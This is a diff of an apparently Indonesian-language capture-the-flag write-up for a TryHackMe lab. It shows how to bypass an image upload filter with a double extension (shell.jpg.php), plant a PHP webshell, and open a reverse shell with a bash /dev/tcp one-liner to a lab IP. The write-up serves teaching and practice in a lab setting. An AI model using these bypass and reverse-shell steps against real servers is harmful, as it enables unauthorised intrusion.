@@ -1,51 +1,70 @@
 # Day 2 |  The Elf Strikes Back
 
-`Web Exploitation` `RCE`
+`TryHackMe` `Web Exploitation` `Security` `RCE` `Bypass`
 
 ---
 ## Learning Outcomes
 
-- Understanding GET and POST parameters
-- Bypassing a file upload
-- Vulnerability Analysis by me!
+Hasil pembelajaran 
+
+- Mengerti HTTP POST dan GET request.
+- Mengetahui daftar direktori umum pada upload file
+- Memahami bagaimana sebuah file upload filter dapat di *bypass*.
+- Memahami Remote Code Execution
+- Code Analysis by me!
 
 ## Summary
 
-1. Find a file upload point.
-2. Try uploading some innocent files -- what does it accept? (Images, text files, PDFs, etc)
-3. Find the directory containing your uploads.
-4. Try to bypass any filters and upload a reverse shell.
-5. Start a netcat listener to receive the shell
-6. Navigate to the shell in your browser and receive a connection!
+tldr;
 
-## Write up
+- Gunakan ID yang diberikan untuk login.
+- Upload sebuah webshell/backdoor untuk melakukan RCE
+- Eksekusi webshell untuk mendapatkan reverse shell
+- Ambil flag pada /var/www/
 
-Pada task kali ini, diberikan suatu ID = ODIzODI5MTNiYmYw.
+## Story
 
-ID tersebut digunakan untuk mengakses/login pada sebuah website dari mesin yang di deploy. 
+> *After your heroic deeds regaining control of the control centre yesterday, Elf McSkidy has decided to give you an important job to do.*
+>
+> *"We know we've been hacked, so we need a way to protect ourselves! The dev team have set up a website for the elves to upload pictures of any suspicious people hanging around the factory, but we need to make sure it's secure before we add it to the public network. Please perform a security audit on the new server and make sure it's unhackable!"*
+
+> For Elf McEager :  
+> *You have been assigned an ID number for your audit of the system: `ODIzODI5MTNiYmYw` . Use this to gain access to the upload section of the site.
+Good luck!*
+
+## Write-up
+
+Pada task kali ini, diberikan suatu ID `ODIzODI5MTNiYmYw` untuk mengakses seksi upload pada website dari mesin yang di deploy. 
 
 ![216ec1cef8706fce53b9beb88299a35d.png](./_resources/43573e0df86d4193b3e3085d5cec04d9.png)
 
-Tertulis cara untuk mengaksesnya adalah mengirimkan *request* dengan parameter `ID` (GET).
+Tertulis cara untuk mengaksesnya adalah mengirimkan request dengan parameter `ID` (GET).
 
-> Pengingat:
->- Metode POST request : data yang dikirim diikutkan body request (tidak tampak di URL, namun bisa di intercept)
->- Metode GET request : data yang dikirim terlihat pada URL berupa parameter
->   - Setiap nilai parameter dipisah dengan &
+> Pengingat :
+>
+> - Metode POST request : data yang dikirim diikutkan body request (tidak tampak di URL)
+> - Metode GET request : data yang dikirim terlihat pada URL berupa parameter
 
-Maka yang perlu dilakukan adalah menambah `?id=ODIzODI5MTNiYmYw` pada alamat URLnya :
+### Q1 : What string of text needs adding to the URL to get access to the upload page?
+
+Yang perlu dilakukan adalah menambah `?id=ODIzODI5MTNiYmYw` pada alamat URLnya sehingga menjadi seperti berikut.
 
 ```
 http://10.10.43.11/?id=ODIzODI5MTNiYmYw
 ```
 
-Dan berhasil masuk dengan tampilan berikut.
+Tampilan setelah mengirimkan request GET dengan parameter `id=ODIzODI5MTNiYmYw`.
 
 ![c196cb699c437c800581393bd693bed8.png](./_resources/369e7c46d6a247a68e2c56a6520e78fc.png)
 
-Pada halaman ini, upload file dapat dilakukan dan ekstensi file yang diminta adalah jpeg, jpg, dan png.
+### Q2 : What type of file is accepted by the site?
+
+Pada halaman ini, file yang dapat di upload adalah file dengan format atau berekstensi `.jpeg`, `.jpg`, dan `.png`.
 
 ![6fc7281b9f43b120870d2661a7f33cc4.png](./_resources/4e66d9a56752494a974331937c6adcc0.png)
+
+
+### Q3 : Bypass the filter and upload a reverse shell. In which directory are the uploaded files stored?
 
 > Common upload directory list :
 > - /uploads
@@ -53,11 +72,9 @@ Pada halaman ini, upload file dapat dilakukan dan ekstensi file yang diminta ada
 > - /media
 > - /resources
 
-Diketahui file yang di *upload* berada pada salah satu *common upload directory*, yaitu `/uploads/`.
+File yang di upload berada pada `/uploads/`.
 
-Dari sini, kita bisa mencoba untuk meng-*upload* webshell.
-
-Saya menggunakan webshell bawaan dari Kali Linux yang terdapat pada directory /usr/share/webshells/
+Karena lokasi file yang di upload sudah diketahui, kita bisa mencoba untuk meng-upload webshell. Saya menggunakan webshell bawaan dari Kali Linux, terdapat pada `/usr/share/webshells/`
 
 ```
 <MAGICBYTES>
@@ -74,9 +91,7 @@ Magicbytes dapat digunakan untuk mem-*bypass* *upload filter*. Sebagai contoh, d
 
 ![2b1f5c137288962d3e193c0bce5093cc.png](./_resources/0aac928f2ead427d9cb1805986af8448.png)
 
-Namun hal tersebut tidak berhasil.  
-
-Tetapi, ketika nama file dibalik menjadi shell.jpg.php, bukan shell.php.jpg, webshell tersebut berhasil di *upload*.
+Namun hal tersebut tidak berhasil. Ketika nama file dibalik menjadi `shell.jpg.php`, bukan `shell.php.jpg`, webshell tersebut berhasil di upload.
 
 ![759dccab6add96541caf6777c2e0ce7a.png](./_resources/f4b4e9df972a42648980fde77011e691.png)
 
@@ -84,12 +99,13 @@ Dengan begitu, ***R**emote **C**ode **E**xecution* (RCE) dapat dilakukan.
 
 ![8a1272d07209ebe2ffba128811fb2302.png](./_resources/c93d20e6d336472db6aa54a7534f2a09.png)
 
-Melalui RCE ini, kita bisa mendapatkan *reverse shell* untuk masuk ke dalam system.
+Melalui RCE ini, kita bisa mendapatkan *reverse shell* untuk masuk ke dalam sistem.
 
 ```
 bash -i >& /dev/tcp/10.9.30.115/9000 0>&1
 ```
- Sedikit penjelasan :
+
+Sedikit penjelasan :
 - bash -i >& /dev/tcp/10.9.30.115/9000   
 Mudahnya dibaca : "Berikan interactive shell dari bash melalui TCP ke 10.9.30.115 di port 9000"
 - 0>&1  
@@ -105,7 +121,9 @@ pwd             <-- ini stdout
 
 ![8525accc17e0b613db09cbaca471ce8e.png](./_resources/c6f980247a834023bb9cb5fd3b73424c.png)
 
-Pencarian kata flag secara rekursif dapat dilakukan dengan perintah berikut.
+### Q4 : What is the flag in /var/www/flag.txt?
+
+Pencarian kata flag secara rekursif dapat dilakukan dengan perintah `Find`.
 
 ```
 find / -type f 2>/dev/null | grep flag
@@ -115,10 +133,10 @@ Flag ditemukan pada direktori `/var/www/`
 
 ![a6306e4a9eeaddec28e4128fd6c846b6.png](./_resources/63d77db614f4487590f9840055323679.png)
 
-Task telah selesai, tetapi pada bagian berikut, saya mencari tahu bagaimana webshell yang diupload dapat lolos dengan mengubah susunan ekstensinya.
+Task telah selesai, tetapi pada bagian selanjutnya, saya mencari tahu bagaimana webshell yang di upload dapat lolos dengan mengubah susunan ekstensinya.
 
 
-## Vulnerability Analysis & Mitigation
+## Code Analysis & Mitigation
 
 
 ### Bypass upload filter 
